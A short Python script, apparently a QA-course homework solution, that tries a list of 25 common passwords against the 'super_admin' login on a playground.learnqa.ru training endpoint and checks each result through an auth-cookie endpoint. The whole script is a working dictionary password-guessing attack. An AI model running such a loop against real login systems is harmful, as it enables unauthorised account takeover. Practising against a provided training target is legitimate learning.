import requests

passwords = ["123456","123456789","qwerty","password","1234567","12345678","12345","iloveyou","111111","123123","abc123","qwerty123","1q2w3e4r","admin","qwertyuiop","654321","555555","lovely","7777777","welcome","888888","princess","dragon","password1","123qwe"]

for i in passwords:
    payload = {
        "login": "super_admin",
        "password": i
    }

    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = payload)
    auth_cookie = response1.cookies["auth_cookie"]

    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie":auth_cookie})
    print(response2.text)
    if response2.text == "You are NOT authorized":
        print("Пароль неверный")
    else:
        print("Пароль верный, пароль = %s" % i)
        break